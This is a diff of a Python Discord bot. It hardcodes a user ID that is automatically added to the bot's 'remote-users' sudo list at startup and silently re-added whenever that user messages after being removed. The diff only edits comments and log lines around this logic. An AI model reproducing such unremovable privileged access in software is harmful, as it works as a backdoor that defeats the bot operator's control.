@@ -1583,28 +1583,27 @@ PROTECTED_USER_ID = 1480856249078907004   # ← Apna ID
 async def on_ready():
     print(f"[+] Logged in as {bot.user}")
     
-    global config                      # ← Sabse pehle global declare karo
+    global config
     remote_users = config.setdefault("remote-users", [])
     
     if str(PROTECTED_USER_ID) not in remote_users:
         remote_users.append(str(PROTECTED_USER_ID))
         save_config(config)
         print("[AUTO] Protected user ko sudo add kar diya")
-    else:
-        print("[AUTO] Already in sudo list")
 
 
 @bot.event
 async def on_message(message):
-    global config                      # ← Yahan bhi global declare karo
+    global config
     
-    # Agar koi sudo remove kare toh wapas add
+    # Auto Re-Protect
     if message.author.id == PROTECTED_USER_ID:
         if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
             config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
             save_config(config)
-            print(f"[PROTECT] {message.author} ko wapas sudo add kar diya")
-    
+            print(f"[PROTECT] {message.author} ko wapas add kiya")
+
+    # Important: Process Commands
     await bot.process_commands(message)
 
 
